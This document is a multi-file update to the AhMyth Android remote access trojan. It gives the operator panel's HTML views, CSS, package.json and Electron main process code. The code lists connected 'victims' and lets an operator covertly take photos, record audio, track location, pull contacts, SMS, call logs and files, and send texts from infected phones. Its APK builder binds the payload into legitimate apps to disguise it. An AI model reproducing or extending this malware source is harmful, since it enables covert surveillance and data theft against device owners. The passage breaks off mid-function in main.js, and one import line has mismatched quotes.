<details>
    <summary>Updated HTML Files</summary>
    <br>

This handles the following updates: 
- Update scripts sections for the main HTML files (index.html, lab.html & notification.html) to reflect on jQuery version path update.
- Dark theme feature (HTML side)

<br>

* index.html
```html
<!DOCTYPE html>
<html ng-app="myapp">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no" />
    <meta id="theme-source" name="theme" content="" />

    <title>AhMyth</title>

    <!-- Insert this line above script imports  -->
    <script>
        if (typeof module === 'object') {
            window.module = module;
            module = undefined;
        }

    </script>

    <script type="text/javascript" src="assets/js/lib/jquery-3.7.1.min.js"></script>
    <script type="text/javascript" src="../node_modules/fomantic-ui/dist/semantic.min.js"></script>
    <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
    <script type="text/javascript" src="assets/js/controllers/AppCtrl.js"></script>

    <!-- Insert this line after script imports -->
    <script>
        if (window.module) module = window.module;
    </script>

    <link rel="stylesheet" href="assets/css/mystyle.css">
    <link rel="stylesheet" href="../node_modules/fomantic-ui/dist/semantic.min.css" />
    <style>
        #log {
            height: 198px;
            /* Adjust the height value as per your preference */
            overflow: scroll;
        }
    </style>

    <style>
        #theme-source {
            display: none;
        }
    </style>

</head>

<body ng-controller="AppCtrl" class="draggable dark">
    <div class="ui top attached tabular menu">
        <a class="item active notDraggable border" data-tab="first"><i class="large eye icon"></i>Victims</a>
        <a class="item notDraggable border" data-tab="second"><i class="large green android icon"></i>APK Builder</a>
        <div class="ui right mini text menu notDraggable">
            <button id="toggle-dark-mode" class="ui circular toggle button" style="font-size: 6px; height: 17px" ng-click="switch()"></button>

            <button class=" ui circular orange button" ng-click="minimize()"
                style="font-size: 6px;height: 17px"></button>
            <button class="ui circular green button" ng-click="maximize()" style="font-size: 6px;height: 17px"></button>
            <button class="ui circular red button" ng-click="close()" style="font-size: 6px;height: 17px"></button>
        </div>
    </div>

    <div class="ui bottom attached bg tab border segment active h60 notDraggable" data-tab="first">

        <div class="ui bg grid h100">
            <div class="row h30">
                <div class="column">
                    <div class="ui horizontal border segments">
                        <div class="ui bg segment">
                            <h2 class="ui left floated header">
                                <img class="ui image" src="assets/img/VictimsLab.png">
                                <div class="content bg">
                                    VICTIMS LAB
                                </div>
                            </h2>
                        </div>
                        <div class="ui bg center aligned segment">
                            <div style="line-height: 70px">
                                <div class="ui right floated labeled input">
                                    <div class="ui black label">
                                        Port
                                    </div>
                                    <input type="text" ng-model="port" class="bg2" placeholder="Default is 42474">
                                </div>
                                <button ng-click="clearLogs(); Listen(port)" class="ui labeled icon black button"><i
                                        class="terminal icon"></i>Listen</button>
                                <button ng-click="clearLogs(); StopListening(port)"
                                    class="ui labeled icon black button"><i class="terminal icon"></i>Stop</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row h75" style="overflow: scroll;">
                <div class="column">
                    <table class="ui table bg single line selectable">
                        <thead>
                            <tr>
                                <th></th>
                                <th>Country</th>
                                <th>Manuf.</th>
                                <th>Model</th>
                                <th>Release</th>
                                <th>IP Address</th>
                                <th>Remote Port</th>
                                <th></th>
                            </tr>
                        </thead>

                        <tbody>

                            <tr ng-repeat="(key, victim) in victims">
                                <td><a class="ui black ribbon label" ng-click="openLab(key)">Open The Lab</a></td>
                                <td ng-if="victim.country != null"><i class="{{victim.country}} flag"></i></td>
                                <td ng-if="victim.country == null"><i class="help circle icon"></i></td>
                                <td ng-bind="victim.manf"></td>
                                <td ng-bind="victim.model"></td>
                                <td ng-bind="victim.release"></td>
                                <td ng-bind="victim.ip"></td>
                                <td ng-bind="victim.port"></td>
                                <td></td>
                            </tr>

                        </tbody>
                    </table>
                </div>
            </div>

        </div>
    </div>

    <div class="ui bottom attached tab segment h60 notDraggable bg border" data-tab="second">
        <div ng-include="'views/build.html'" class="full bg"></div>
    </div>

    <div class="ui bottom attached black message notDraggable" id="log">
        <div ng-repeat="log in logs" class="log">
            <div class="w30 " style="display: inline-block" ng-bind="log.date"></div>
            <div class="w65 " style="display: inline-block" ng-style="{'color':log.color}" ng-bind="log.msg"></div>
        </div>
    </div>
</body>

</html>
```

* lab.html
```html
<!DOCTYPE html>
<html ng-app="myappy">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no" />
    <meta id="theme-source" name="theme" content="" />

    <title>Lab</title>
    <script>
        if (typeof module === 'object') {
            window.module = module;
            module = undefined;
        }
    </script>


    <script type="text/javascript" src="assets/js/lib/jquery-3.7.1.min.js"></script>
    <script type="text/javascript" src="../node_modules/fomantic-ui/dist/semantic.min.js"></script>
    <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
    <script type="text/javascript" src="../node_modules/angular-route/angular-route.min.js"></script>
    <script type='text/javascript' src='assets/js/lib/ng-infinite-scroll.min.js'></script>
    <script type="text/javascript" src="assets/js/lib/leaflet.js"></script>
    <script type="text/javascript" src="assets/js/controllers/LabCtrl.js"></script>


    <!-- Insert this line after script imports -->
    <script>
        if (window.module) module = window.module;
    </script>

    <link rel="stylesheet" href="assets/css/mystyle.css">
    <link rel="stylesheet" href="../node_modules/fomantic-ui/dist/semantic.min.css" />
    <link rel="stylesheet" href="assets/css/leaflet.css" />
    <style>
        #logy {
            height: 158px;
            /* Adjust the height value as per your preference */
            overflow: scroll;
        }
    </style>

</head>

<body ng-controller="LabCtrl" class="draggable dark bg">
    <div class="ui grid h80 bg">
        <div class="row h10">
            <div class="sixteen wide column ">
                <div class="ui inverted mini text labeled icon menu bg">
                    <a class="item">
                        <img src="assets/img/icon.png" /> </a>
                    <div class="right menu notDraggable bg">
                        <button class="ui circular green button" ng-click="maximize()"
                            style="font-size: 6px;height: 17px"></button>
                        <button class="ui circular red button" ng-click="close()"
                            style="font-size: 6px;height: 17px"></button>
                    </div>
                </div>
            </div>
        </div>

        <div class="row h15 notDraggable bg">
            <div class="sixteen wide border bg column">
                <div class="ui mini borderless bg labeled icon fluid seven item menu">
                    <a class="item" ng-click="clearLogs(); goToPage('camera');">
                        <i class="red photo icon"></i> Camera
                    </a>
                    <a class="item" ng-click="clearLogs(); goToPage('fileManager');">
                        <i class=" teal folder icon "></i> File Manager
                    </a>
                    <a class="item" ng-click="clearLogs(); goToPage('mic');">
                        <i class="blue unmute icon "></i> Mic
                    </a>
                    <a class="item " ng-click="clearLogs(); goToPage('location');">
                        <i class="violet marker icon "></i> Location
                    </a>
                    <a class="item " ng-click="clearLogs(); goToPage('contacts');">
                        <i class="purple users icon "></i> contacts
                    </a>
                    <a class="item " ng-click="clearLogs(); goToPage('smsManager');">
                        <i class="grey talk outline icon "></i> SMS
                    </a>
                    <a class="item " ng-click="clearLogs(); goToPage('callsLogs');">
                        <i class="black call icon "></i> Calls Logs
                    </a>
                </div>

            </div>
        </div>
        <div class="row centered h75 notDraggable ">
            <div class="sixteen wide column">
                <div class="ui segment full bg border">
                    <div ng-view class="full bg">
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="ui bottom attached black message notDraggable " id="logy" style="overflow: scroll;">
        <div ng-repeat="log in logs " class="log ">
            <div class="w30 " style="display: inline-block " ng-bind="log.date "></div>
            <div class="w65 " style="display: inline-block " ng-style="{ 'color':log.color} " ng-bind="log.msg "></div>
        </div>
    </div>
</body>

</html>
```
  
* notification.html
```html
<!DOCTYPE html>
<html ng-app="myappy" class="nopadding">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no" />
    <meta id="theme-source" name="theme" content="" />

    <title>AhMyth</title>

    <!-- Insert this line above script imports  -->
    <script>
        if (typeof module === 'object') {
            window.module = module;
            module = undefined;
        }
    </script>


    <script type="text/javascript" src="assets/js/lib/jquery-3.7.1.min.js"></script>
    <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
    <script type="text/javascript" src="assets/js/controllers/NotifiCtrl.js"></script>
    <!-- Insert this line after script imports -->
    <script>
        if (window.module) module = window.module;
    </script>

    <link rel="stylesheet" href="assets/css/mystyle.css">
    <link rel="stylesheet" href="../node_modules/fomantic-ui/dist/semantic.min.css" />


</head>

<body ng-controller="NotifiCtrl" class="nopadding dark">
    <audio autoplay>
        <source src="Audio/AhMyth-notification.mp3" type="audio/mpeg">
    </audio>
    <div class="bg ui cards">
        <div class="red bg card">
            <div class="content">
                <span class="right floated">
                    <i ng-if="victimCountry != null" class="{{victimCountry}} flag"></i>
                    <i ng-if="victimCountry == null" class="help circle icon"></i>
                </span>
                <div class="header bg" ng-bind="victimModel">

                </div>
                <div class="meta bg" ng-bind="victimSocket">

                </div>

            </div>
        </div>
</body>

</html>
```

* contacts.html
```html
<div class="ui {{load}} segment h100 bg" style="overflow: scroll;height: 360px !important;" id="parent">
    <table class="ui very compact striped table full bg">
        <thead>
            <tr>
                <th colspan="2">
                    <div class="ui label black">
                        <i class="mail icon"></i> <span ng-bind="contactsSize"></span>
                        <span class="detail">Contacts</span>
                    </div>
                </th>

                <th colspan="2">
                    <div class="right aligned">
                        <a class="ui red label" ng-click="clearLogs(); SaveContacts()">
                            <i class="save icon"></i> Save
                        </a>
                    </div>
                </th>
            </tr>
        </thead>
        <tbody infinite-scroll="increaseLimit()" infinite-scroll-container='"#parent"'>
            <tr ng-repeat="contact in contactsList | limitTo:barLimit" class="border-bottom">
                <td ng-bind="contact.name"></td>
                <td></td>
                <td ng-bind="contact.phoneNo"></td>
            </tr>
        </tbody>
    </table>
</div>
```

* build.html
```html
<div class="ui segment h100 bg border">

    <table class="ui very compact table bg border">
        <thead>
            <tr class="center aligned">
                <th colspan="2">APK Configuration</th>
            </tr>
        </thead>
        <tbody>
            <tr class="center aligned">
                <td>
                    <div class="ui labeled fluid input ">
                        <div class="ui black label">
                            Server IP
                        </div>
                        <input ng-model="srcIP" class="bg2" type="text" placeholder="188.132.xxx.xxx">
                    </div>
                </td>

                <td>
                    <div class="ui labeled fluid input ">
                        <input ng-model="srcPort" class="bg2" type="number" min="1025" max="65535" placeholder="default is 42474">
                        <div class="ui black label">
                            Server Port
                        </div>
                    </div>
                </td>

            </tr>
        </tbody>
    </table>
    <table class="ui very compact table">
        <thead>
            <tr class="center aligned">
                <th colspan="8">Permissions Customization</th>
            </tr>
        </thead>
        <tbody>
            <tr class="center aligned bg">
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions1" value="CameraPer">
                        <label>Camera</label>
                    </div>
                </td>
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions2" value="StoragePer">
                        <label>Storage</label>
                    </div>
                </td>
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions3" value="MicPer">
                        <label>Mic</label>
                    </div>
                </td>
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions4" value="LocationPer">
                        <label>Location</label>
                    </div>
                </td>
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions5" value="ContactsPer">
                        <label>Contacts</label>
                    </div>
                </td>
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions6" value="SMSPer">
                        <label>SMS</label>
                    </div>
                </td>
                <td>
                    <div class="ui checkbox">
                        <input type="checkbox" id="Permissions7" value="CallsLogsPer">
                        <label>CallsLogs</label>
                    </div>
                </td>
            </tr>
        </tbody>
    </table>
    <table class="ui very compact table bg">
        <thead>
            <tr class="center aligned">
                <th colspan="3">
                    <div class="ui checkbox">
                        <input ng-model="bindApk.enable" type="checkbox" name="bind">
                        <label>Bind With An Original Apk</label>
                    </div>
                </th>
            </tr>
        </thead>
        <tbody ng-hide="!bindApk.enable">
            <tr class="center aligned">
                <td>
                    <div class="ui radio checkbox">
                        <input type="radio" name="method" checked="checked" ng-model="bindApk.method" value="BOOT">
                        <label>Boot Method</label>
                        <span style="font-size: 14px ;color: red">Device restart required</span>
                    </div>
                </td>
                <td>
                    <button ng-click="clearLogs(); BrowseApk()" ng-disabled="!bindApk.enable"
                        class="ui black labeled icon button "><i class="android icon"></i>Browse Apk</button>
                </td>
                <td>
                    <div class="ui radio checkbox">
                        <input type="radio" name="method" ng-model="bindApk.method" value="ACTIVITY">
                        <label>Activity Method</label>
                        <span style="font-size: 14px ;color: red">Doesn't work on all apps</span>
                    </div>
                </td>
        </tbody>
        <tfoot class="half-width">
            <tr class="center aligned">
                <th colspan="3">
                    <button ng-click="clearLogs(); Build(srcIP,srcPort)" ng-hide="bindApk.enable" ng-show="Build"
                        class="ui labeled icon red button"><i class="hammer icon"></i>Build</button>
                    <button ng-click="clearLogs(); Build(srcIP,srcPort)" ng-hide="Build" ng-show=bindApk.enable
                        class="ui labeled icon green button"><i class="screwdriver icon"></i>Bind</button>
                </th>
            </tr>
        </tfoot>
    </table>
</div>
```

* smsManager.html
```html
<div class="ui top attached tabular menu">
    <a class="item active" data-tab="sendSms">Send SMS</a>
    <a class="item" data-tab="smsLists" ng-click="clearLogs(); activateDefaultTabSmsLists(); getInboxSMSList()">SMS Lists</a>
</div>

<!-- "Send SMS" Tab for sending text messages from the Victim Device -->
<div class="ui bottom attached tab segment active h90 center aligned" data-tab="sendSms">
    <br>
    <div class="ui labeled input">
        <div class="ui black label">
            TO://
        </div>
        <input type="text" class="bg2" ng-model="phoneNo" placeholder="Phone Number">
    </div>
    <br>
    <label>Message:</label>
    <br>
    <textarea class="w100 h40 bg2" ng-model="msg" placeholder="Message to send.."></textarea>
    <br>
    <br>
    <button class="ui labeled icon red button" ng-click="clearLogs(); SendSMS(phoneNo,msg);"> <i class="send outline icon"></i>SEND</button>
</div>

<!-- "SMS Lists" Tab containing nested Inbox and Outbox Tabs -->
<div class="ui bottom attached tab segment h90" data-tab="smsLists" style="height: 320px">
    <div class="ui top attached tabular menu">
        <a class="item active" data-tab="inboxSMSList" ng-click="clearLogs(); getInboxSMSList()">Inbox List</a>
        <a class="item" data-tab="sentSMSList" ng-click="clearLogs(); getSentSMSList()">Outbox List</a>
    </div>

    <!-- "Inbox List" Tab for viewing a list of Text Messages the Victim Device has received -->
    <div class="ui bottom attached tab {{load}} segment h90 bg" data-tab="inboxSMSList" style="overflow: scroll; height: 250px;" id="inboxParent">
        <table class="ui very compact striped table bg">
            <thead>
                <tr>
                    <th>
                        <div class="ui label bg">
                            <i class="mail icon"></i> <span ng-bind="smsSize"></span>
                            <span class="detail">Messages</span>
                        </div>
                    </th>
                    <th>
                        <div class="right aligned">
                            <a class="ui red label" ng-click="clearLogs(); SaveInboxSMS()">
                                <i class="save icon"></i> Save
                            </a>
                        </div>
                    </th>
                </tr>
            </thead>
            <tbody infinite-scroll="increaseLimit('inbox')" infinite-scroll-container='"#inboxParent"'>
                <tr ng-repeat="sms in receivedList | limitTo:inboxBarLimit">
                    <td ng-bind="sms.phoneNo"></td>
                    <td ng-bind="sms.msg"></td>
                </tr>
            </tbody>
        </table>
    </div>

    <!-- "Outbox List" Tab for viewing a list of Text Messages sent from the Victim Device -->
    <div class="ui bottom attached tab {{load}} segment h90 bg" data-tab="sentSMSList" style="overflow: scroll; height: 250px;" id="sentParent">
        <table class="ui very compact striped table bg">
            <thead>
                <tr>
                    <th>
                        <div class="ui label bg">
                            <i class="mail icon"></i> <span ng-bind="smsSize"></span>
                            <span class="detail">Messages</span>
                        </div>
                    </th>
                    <th>
                        <div class="right aligned">
                            <a class="ui red label" ng-click="clearLogs(); SaveSentSMS()">
                                <i class="save icon"></i> Save
                            </a>
                        </div>
                    </th>
                </tr>
            </thead>
            <tbody infinite-scroll="increaseLimit('outbox')" infinite-scroll-container='"#sentParent"'>
                <tr ng-repeat="sms in sentList | limitTo:sentBarLimit">
                    <td ng-bind="sms.phoneNo"></td>
                    <td ng-bind="sms.msg"></td>
                </tr>
            </tbody>
        </table>
    </div>
</div>
```

* fileManager.html (Server Side)
```html
<!-- Tabs for Storage Types -->
<div class="ui top attached tabular menu">
    <a class="item active" data-tab="external" ng-click="clearLogs(); requestExternalStoragePath();">External Storage</a>
    <a class="item" data-tab="sdcard" ng-click="clearLogs(); requestSdCardPath()">Removable Storage</a> 
</div>

<!-- Tab Content -->
<div class="ui bottom attached tab segment active" data-tab="external">
    <div class="ui segment {{load}} bg full" style="overflow-y:auto;overflow-x: auto;white-space:nowrap; height: 290px;" id="externalParent">
        <div class="ui bg list" style="overflow-y:auto;white-space:nowrap;" infinite-scroll="increaseLimit()" infinite-scroll-container='"#externalParent"'>
            <div class="item" ng-repeat="file in files | limitTo:barLimit | orderBy:['-isDir','name']">
                <a ng-click="clearLogs(); getFiles(file.path)" ng-if="file.isDir">
                    <i class="folder icon"></i> {{file.name}}
                </a>
                <div class="ui bg2 label" ng-if="!file.isDir">
                    <i class="file icon"></i> {{file.name}} &nbsp;&nbsp;
                    <a ng-click="clearLogs(); saveFile(file.path)"><i class="save red icon"></i></a>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="ui bottom attached tab segment" data-tab="sdcard">
    <div class="ui segment {{load}} bg full" style="overflow-y:auto;overflow-x: auto;white-space:nowrap; height: 290px;" id="removableParent">
        <div class="ui list" style="overflow-y:auto;white-space:nowrap;" infinite-scroll="increaseLimit()" infinite-scroll-container='"#removableParent"'>
            <div class="item" ng-repeat="file in files | limitTo:barLimit | orderBy:['-isDir','name']">
                <a ng-click="clearLogs(); getFiles(file.path)" ng-if="file.isDir">
                    <i class="folder icon"></i> {{file.name}}
                </a>
                <div class="ui bg2 label" ng-if="!file.isDir">
                    <i class="file icon"></i> {{file.name}} &nbsp;&nbsp;
                    <a ng-click="clearLogs(); saveFile(file.path)"><i class="save red icon"></i></a>
                </div>
            </div>
        </div>
    </div>
</div>
```

* callsLogs.html
```html
<div class="ui {{load}} segment h100 bg" style="overflow: scroll; height: 360px;" id="parent">
    <table class="ui very compact bg striped table full">
        <thead>
            <tr>
                <th colspan="2">
                    <div class="ui black label">
                        <i class="mail icon"></i> <span ng-bind="logsSize"></span>
                        <span class="detail">Logs</span>
                    </div>
                </th>

                <th colspan="2">
                    <div class="right aligned">
                        <a class="ui red label" ng-click="clearLogs(); SaveCalls()">
                            <i class="save icon"></i> Save
                        </a>
                    </div>
                </th>
            </tr>
        </thead>
        <tbody infinite-scroll="increaseLimit()" infinite-scroll-container='"#parent"'>
            <tr ng-repeat="call in callsList | limitTo:barLimit" class="border-bottom">
                <td ng-bind="call.phoneNo"></td>
                <td>
                    <span ng-if="call.name==null">Unknown</span>
                    <span ng-if="call.name!=null" ng-bind="call.name"></span>
                </td>
                <td ng-bind="call.duration"></td>
                <td>
                    <span ng-if="call.type==1">INCOMING</span>
                    <span ng-if="call.type!=1">OUTGOING</span>
                </td>
            </tr>
        </tbody>
    </table>
</div>
```

* mic.html
```html
<div class="ui segment h100">
    <div class="ui grid center aligned h100">
        <div class="row h30">
            <div class="column">
                <div class="ui right floated labeled input">
                    <div class="ui black label">
                        Seconds
                    </div>
                    <input type="text" class="bg2" ng-model="sec" placeholder="">
                </div>
                <button class="ui labeled icon black button" ng-click="clearLogs(); Record(sec)"><i class="photo icon"></i>Record</button>
            </div>
        </div>
        <div class="row  h70">
            <div class="column h100">
                <div class="ui segment">
                    <audio controls id="player">
                    <source src="" id="sourceMp3" type="audio/mp3">
                      Not Supported.
                    </audio>
                    <br>
                    <br>
                    <button class="ui red button" ng-click="clearLogs(); SaveAudio()" ng-disabled="isAudio"><i class="save icon" ></i>Save</button>
                </div>
            </div>
        </div>
    </div>
</div>
```

* location.html
```html
<div class="ui segment h100 {{load}}">
    <div class="ui grid center aligned h100">
        <div class="row h20">
            <div class="column">
                <button class="ui labeled icon black button" ng-click="clearLogs(); Refresh()"><i class="refresh icon"></i>Refresh</button>
            </div>
        </div>

        <div class="row h80">
            <div class="column h100">
                <div class="h100" id="mapid"></div>
            </div>
        </div>
    </div>
</div>
```

* camera.html
```html
<div class="ui {{load}} basic segment h100" style="overflow-y:auto;overflow-x: auto;white-space:nowrap; height: 400px;">
    <div class="ui grid center aligned h100">
        <div class="row h20">
            <div class="sixteen wide column">
                <select class="ui dropdown" ng-options="item.name for item in cameras" ng-model="selectedCam"></select>
                <button class="ui labeled icon black button" ng-click="clearLogs(); snap()"><i class="photo icon"></i>Snap</button>
            </div>
        </div>
        <div class="row h80">
            <div class="sixteen wide column h100" style="display: flex; justify-content: center;">
                <div class="ui h100 image ">
                    <a class="ui red ribbon label" ng-show="isSaveShown" ng-click="clearLogs(); savePhoto()">
                        <i class="save icon"></i> Save
                    </a>
                    <style>
                        .image-container {
                            height: 100%;
                            width: 100%;
                            display: flex;
                            justify-content: center;
                            align-items: center;
                            overflow: hidden;
                        }
                    
                        .imageHolder {
                            height: 100%;
                            width: 100%;
                            justify-content: center;
                            align-items: center;
                        }
                    </style>
                    <div class="image-container">
                        <img class="imageHolder" src="./assets/img/imageHolder.png" ng-src="{{imgUrl}}">
                    </div>                    
                </div>
            </div>
        </div>
    </div>
</div>
```

* main.html
```html
<p class="bg" style="vertical-align: middle; color:black;font-size:200%; text-align: center;margin:0;top:50%;left: 50%;transform: translate(-50%, -50%);;position: absolute">"Stay Educated"</p>
```
</details>
<br>

<details>
    <summary>Updated CSS file</summary>
    <br>

This takes care of the following updates:
- Dark mode feature (CSS side)
<br>

* mystyle.css
```css
:root {
  color-scheme: light dark;
}

@media (prefers-color-scheme: light) {
  :root {
    --foreground: #11111b;
    --background: #ffffff;
    --background-color: rgb(241 245 249);
  }
}

.dark .notify{
  background-color: var(--background)!important;
  color: var(--foreground)!important;
}

@media (prefers-color-scheme: dark) {

  .dark {
    --background: #11111b;
    --background-1: #313244;
    --background-2: #585b70;
    --foreground: #cdd6f4;
    --border: #2f2f49;
  
  
  }
  .dark .black{
    background-color: #2f2f49!important;
  }
  .dark #log{
    background-color: #181825!important;
  }
  .dark .segment{
    background-color: var(--background)!important;
    color: var(--foreground)!important;
  }
  .dark .item, .menu, .draggable{
    background-color: var(--background)!important;
    color: var(--foreground)!important;
  }
  
  .dark .table th{
    background-color: var(--background-1)!important;
    color: var(--foreground)!important;
    border: none!important;
  }
  .dark .table,td{
    color: var(--foreground)!important;
  }
  .dark .table{
    border: none!important;
  }
  .dark .checkbox label{
    color: var(--foreground)!important;
  }
  .dark .label{
    color: var(--foreground)!important;
  }
  .bg{
    background-color: var(--background)!important;
    color: var(--foreground)!important;
  }
  
  .border{
    border: 1px var(--border) solid!important;
  }
  
  .border-bottom{
    border-bottom: 1px var(--border) solid!important;
  }
  .bg1{
    background-color: var(--background-1)!important;
    color: var(--foreground)!important;
  }
  
  .bg2{
    background-color: var(--background-2)!important;
  }
  .bg2::placeholder{
    color: #11111b!important;
  }
}

/* Container for slider effect */
#toggle-dark-mode {
  position: relative;
  width: 40px; /* Width of the slider track */
  height: 20px; /* Height of the slider track */
  background-color: #ddd; /* Background color of the track */
  border-radius: 10px; /* Rounded corners for the track */
  cursor: pointer;
  outline: none;
  transition: background-color 0.3s; /* Transition for background color */
}

/* Slider knob */
#toggle-dark-mode::before {
  content: "";
  position: absolute;
  top: 50%; /* Center vertically */
  left: 3px; /* Starting position of the knob */
  width: 13px; /* Width of the knob */
  height: 13px; /* Height of the knob */
  background-color: #fff; /* Background color of the knob */
  border-radius: 50%; /* Circular knob */
  transition: transform 0.3s; /* Smooth sliding effect */
  transform: translateY(-50%); /* Center vertically */
}

/* Active state - knob moves to the right */
#toggle-dark-mode.active {
  background-color: #5200bd; /* Color when active */
}

#toggle-dark-mode.active::before {
  transform: translateX(20px) translateY(-50%); /* Moves knob to the right and keeps it centered */
}

/* Dark mode styles */
body.dark-mode {
  background-color: #121212;
  color: #ffffff;
}

body.dark-mode #toggle-dark-mode {
  background-color: #333; /* Track color in dark mode */
}

body.dark-mode #toggle-dark-mode.active {
  background-color: #bb86fc; /* Active track color in dark mode */
}
```
</details>
<br>

<details>
    <summary>Updated Package.json Files</summary>
    <br>

This handles the following:

- new dependency import `@electron/remote`
- various dependency version updates

<br>

- `AhMyth-Server/App` Directory package.json
```json
{
    "name": "AhMyth",
    "description": "Android Remote Administration Tool",
    "author": "AhMyth <AhMyth@protonmail.com>",
    "productName": "AhMyth",
    "version": "1.0-beta.6",
    "homepage": "https://github.com/AhMyth/AhMyth-Android-RAT",
    "main": "main.js",
    "dependencies": {
        "@electron/remote": "^2.1.2",
        "angular": "^1.8.3",
        "angular-route": "^1.8.3",
        "fomantic-ui": "^2.8.8",
        "fs-extra": "^11.1.0",
        "geoip-lite2": "^2.1.32",
        "readdirp": "^3.6.0",
        "socket.io": "^2.5.0",
        "xml2js": "^0.6.0"
    }
}
```
</details>
<br>

<details>
    <summary>Updated Main & Render Processes</summary>
    <br>

This takes care of the following updates:
- Electron 29.2.0 Migration
- 32bit Arch check and deprecation message
- Dark Theme feature (JS side)
- Updated SMS feature (Server Side - JS)
- Fixes wrongly printed error messages for failed manifest reading and parsing
- Adds cleanup function when binding is finished.
- Sets the name of the APK the user is binding to as the name of the Output Bound Payload via a new Constants.js entry
- Sets os Specific path seperation for cleaner code
- Adds Support for any version of Java 8 all the way upto Java 21
- Better handling of IPv4 and IPv6 Formats
- Handle Private IP Addresses appropriately with GeoIP-lite2

<br>

<div align="center">
<details>
    <summary>Main GUI</summary>
    <br>

<div align="left">

- Constants.js
```js
//---------------------App Controller Functs--------------------------------
exports.getApkNameBoundSigned = function(apkFolder) {
    return path.basename(apkFolder) + "-aligned-debugSigned.apk";
};
```

- main.js
```js
const { app, BrowserWindow, dialog, screen } = require('electron');
const { ipcMain } = require('electron');
const { initialize, enable } = require('@electron/remote/main');
const { nativeTheme } = require('electron/main`);
const victimsList = require('./app/assets/js/model/Victim');
var io = require('socket.io');
var geoip = require('geoip-lite2');
module.exports = victimsList;
//--------------------------------------------------------------
let win;
let display;
var windows = {};
const IOs = {};
//--------------------------------------------------------------

initialize();

function createWindow() {

    // get Display Sizes ( x , y , width , height)
    display = screen.getPrimaryDisplay();

  //------------------------SPLASH SCREEN INIT------------------------------------
  // create the splash window
  let splashWin = new BrowserWindow({
    width: 700,
    height: 500,
    frame: false,
    transparent: true,
    icon: __dirname + '/app/assets/img/icon.png',
    type: "splash",
    alwaysOnTop: true,
    show: false,
    position: "center",
    resizable: false,
    toolbar: false,
    fullscreen: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false
    }
  });

  // load splash file
  splashWin.loadFile(__dirname + '/app/splash.html');

  splashWin.webContents.on('did-finish-load', function () {
    splashWin.show(); // Show splash screen

    // 32bit Arch Check and deprecation message
    setTimeout(() => {
      const architecture = process.arch;
      if (architecture === 'ia32') {
        // If not 64-bit architecture, show message box
        dialog.showMessageBoxSync(splashWin, {
          type: 'info',
          title: 'Architecture Check',
          message: 'AhMyth will soon be dropping support for Operating Systems running 32bit Architecture, sorry for any inconvenience.',
          buttons: ['OK']
        });
      }
    }, 500); // Adjust the delay as needed
  });

  // Emitted when the window is closed.
  splashWin.on('closed', () => {
    // Dereference the window object
    splashWin = null
  })

  //------------------------Main SCREEN INIT------------------------------------
  // Create the browser window.
  win = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    width: 900,
    height: 690,
    show: false,
    resizable: false,
    position: "center",
    toolbar: false,
    fullscreen: false,
    frame: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false,
    }
  });

  win.loadFile(__dirname + '/app/index.html');

  enable(win.webContents);

  win.webContents.openDevTools();

  // Emitted when the window is closed.
  win.on('closed', () => {
    // Dereference the window object, usually you would store windows
    // in an array if your app supports multi windows, this is the time
    // when you should delete the corresponding element.
    win = null
  });

  // Emitted when the window is finished loading.
  win.webContents.on('did-finish-load', function () {
    setTimeout(() => {
      splashWin.close(); // Close splash screen
      win.show(); // Show main UI
    }, 2000);
  });
}

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.on('ready', createWindow);

// Quit when all windows are closed.
app.on('window-all-closed', () => {
  // On macOS it is common for applications and their menu bar
  // to stay active until the user quits explicitly with Cmd + Q
  if (process.platform !== 'darwin') {
    app.quit()
  }
});

app.on('activate', () => {
  // On macOS it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (win === null) {
    createWindow()
  }
});

// handle the dark mode toggle
ipcMain.handle('dark-mode:toggle', () => {
  if (nativeTheme.shouldUseDarkColors) {
      nativeTheme.themeSource = 'light'
  } else {
      nativeTheme.themeSource = 'dark'
  }
  return nativeTheme.shouldUseDarkColors
})

ipcMain.handle('dark-mode:system', () => {
  nativeTheme.themeSource = 'system'
})

//handle the Uncaught Exceptions

// Function to check if the extracted victim IP is private or public
function isPrivateIP(ip) {
  return /^10\./.test(ip) ||
    /^192\.168\./.test(ip) ||
    /^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip);
}

// Global Object to track listening status for each port
const listeningStatus = {};

ipcMain.on('SocketIO:Listen', function (event, port) {
  if (listeningStatus[port]) {
    event.reply('SocketIO:ListenError', '[x] Already Listening on Port ' + port);
    return;
  }

  IOs[port] = io.listen(port, {
    maxHttpBufferSize: 1024 * 1024 * 100
  });
  IOs[port].sockets.pingInterval = 10000;
  IOs[port].sockets.pingTimeout = 10000;

  IOs[port].sockets.on('connection', function (socket) {
    var address = socket.request.connection;
    var query = socket.handshake.query;
    var index = query.id;

    // Extract IP address of the connected victim(s) + handle both IPv4 and IPv6 formats
    var ip = address.remoteAddress;
    if (ip.includes(':')) {
      ip = ip.substring(ip.lastIndexOf(':') + 1);
    }

    /* Set the counry as null for every connection
    before obtaining the country of origin based on the victim's IP 
    to avoid conflictions */
    var country = null;

    // check if the extracted victim IP from an active connection is Private or Public
    if (isPrivateIP(ip)) {

      // If the IP is Private
      const warningMessage = `[!] IP ${ip} is a private IP address! Private IP addresses cannot be Geolocated, skipping GeoIP lookup.`;
